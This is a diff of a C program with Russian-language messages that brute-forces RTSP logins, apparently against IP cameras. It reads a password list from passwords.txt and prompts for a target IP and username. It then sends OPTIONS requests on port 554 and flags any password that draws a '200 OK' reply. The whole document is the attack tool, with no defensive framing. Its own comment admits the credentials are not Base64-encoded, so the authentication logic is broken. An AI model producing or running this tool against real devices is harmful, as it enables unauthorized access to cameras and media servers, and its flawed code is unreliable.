@@ -4,119 +4,114 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 
-#define BUFFER_SIZE 1024
+#define BUFFER_SIZE 2048
 #define PASSWORD_LENGTH 100
 
-// Функция для брутфорсинга RTSP
 void rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
     int sock;
     struct sockaddr_in server_addr;
     char request[BUFFER_SIZE];
     char response[BUFFER_SIZE];
 
-    // Создаем сокет
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
-        perror("Ошибка создания сокета");
+        perror("[-] Ошибка создания сокета");
         return;
     }
 
-    // Настраиваем адрес сервера
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(target_port);
-    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);
-
-    // Подключаемся к серверу
-    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-        perror("Ошибка подключения");
+    if (inet_pton(AF_INET, target_ip, &server_addr.sin_addr) <= 0) {
+        printf("[-] Неверный IP-адрес: %s\n", target_ip);
         close(sock);
         return;
     }
 
-    // Формируем RTSP запрос
-    snprintf(request, sizeof(request), "OPTIONS rtsp://%s/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic %s:%s\r\n\r\n", target_ip, username, password);
+    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        perror("[-] Ошибка подключения");
+        close(sock);
+        return;
+    }
+
+    // Важно: Base64 обычно нужен для авторизации, а не просто username:password
+    // Мы делаем обычную отправку без base64, что может не пройти авторизацию
+    snprintf(request, sizeof(request),
+             "OPTIONS rtsp://%s/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic %s:%s\r\n\r\n",
+             target_ip, username, password);
     send(sock, request, strlen(request), 0);
 
-    // Получаем ответ
-    recv(sock, response, sizeof(response) - 1, 0);
-    response[sizeof(response) - 1] = '\0'; // Обеспечиваем нуль-терминацию
+    int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
+    if (bytes_received > 0) {
+        response[bytes_received] = '\0';
 
-    // Проверяем ответ
-    if (strstr(response, "200 OK") != NULL) {
-        // Выводим успешный пароль зеленым цветом
-        printf("\033[0;32mУспешный пароль: %s\033[0m\n", password);
-        close(sock);
-        return; // Возвращаемся, чтобы продолжить проверку других паролей
+        if (strstr(response, "200 OK") != NULL) {
+            printf("\033[1;32m[+] Успешный пароль: %s\033[0m\n", password);
+        } else {
+            printf("\033[1;31m[-] Неверный пароль: %s\033[0m\n", password);
+        }
     } else {
-        printf("Неверный пароль: %s\n", password);
+        printf("[-] Нет ответа от сервера\n");
     }
 
     close(sock);
 }
 
 int main() {
-    char target_ip[16];
-    int target_port = 554; // Стандартный порт RTSP
-    const char *username = "admin"; // Имя пользователя
+    char target_ip[32];
+    int target_port = 554;
+    char username[100];
     char **passwords = NULL;
     int password_count = 0;
-    int capacity = 10; // Начальная емкость для паролей
+    int capacity = 10;
 
-    // Выделяем память для массива паролей
     passwords = malloc(capacity * sizeof(char *));
-    if (passwords == NULL) {
+    if (!passwords) {
         perror("Ошибка выделения памяти");
         return 1;
     }
 
-    // Открываем файл с паролями
     FILE *file = fopen("passwords.txt", "r");
-    if (file == NULL) {
-        perror("Ошибка открытия файла");
+    if (!file) {
+        perror("Не удалось открыть файл passwords.txt");
         free(passwords);
         return 1;
     }
 
-    // Читаем пароли из файла
     char buffer[PASSWORD_LENGTH];
-    while (fgets(buffer, PASSWORD_LENGTH, file) != NULL) {
-        // Убираем символ новой строки, если он есть
+    while (fgets(buffer, PASSWORD_LENGTH, file)) {
         buffer[strcspn(buffer, "\n")] = 0;
-
-        // Если емкость массива паролей исчерпана, увеличиваем ее
         if (password_count >= capacity) {
-            capacity *= 2; // Увеличиваем емкость вдвое
+            capacity *= 2;
             passwords = realloc(passwords, capacity * sizeof(char *));
-            if (passwords == NULL) {
-                perror("Ошибка выделения памяти");
+            if (!passwords) {
+                perror("Ошибка realloc");
                 fclose(file);
                 return 1;
             }
         }
-
-        // Выделяем память для нового пароля и копируем его
-        passwords[password_count] = malloc((strlen(buffer) + 1) * sizeof(char));
-        if (passwords[password_count] == NULL) {
-            perror("Ошибка выделения памяти");
+        passwords[password_count] = strdup(buffer);
+        if (!passwords[password_count]) {
+            perror("Ошибка strdup");
             fclose(file);
             return 1;
         }
-        strcpy(passwords[password_count], buffer);
         password_count++;
     }
     fclose(file);
 
-    // Запрашиваем IP-адрес у пользователя
     printf("Введите IP-адрес RTSP сервера: ");
-    scanf("%15s", target_ip);
+    scanf("%31s", target_ip);
 
-    // Перебираем пароли
+    printf("Введите логин (по умолчанию admin): ");
+    scanf("%99s", username);
+
+    printf("Начинаю перебор паролей для %s@%s:%d\n", username, target_ip, target_port);
+
     for (int i = 0; i < password_count; i++) {
         rtsp_bruteforce(target_ip, target_port, username, passwords[i]);
-        free(passwords[i]); // Освобождаем память для каждого пароля
+        free(passwords[i]);
     }
 
-    free(passwords); // Освобождаем память для массива паролей
+    free(passwords);
     return 0;
 }
-       
